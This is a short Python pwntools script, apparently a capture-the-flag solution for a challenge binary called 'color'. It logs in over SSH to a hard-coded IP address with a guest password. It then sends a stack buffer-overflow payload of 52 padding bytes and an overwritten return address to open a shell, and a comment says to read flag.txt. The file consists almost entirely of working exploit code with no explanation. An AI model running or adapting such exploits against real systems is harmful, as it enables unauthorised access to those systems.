#!/usr/bin/python3
from pwn import *
import struct

# open ssh
io = ssh('color', '104.131.79.111', port=1001, password="guest").process('/bin/sh', env={"PS1":""})


# send payload
payload = b""
payload += b"'"
payload += b'A'*52
payload += b'\x57\x86\x04\x08'
payload += b"'"
payload = b'(python -c "print(' + payload + b')"; cat) | ./color'

io.sendline(payload)

io.interactive()
# shell acquired, type "cat flag.txt"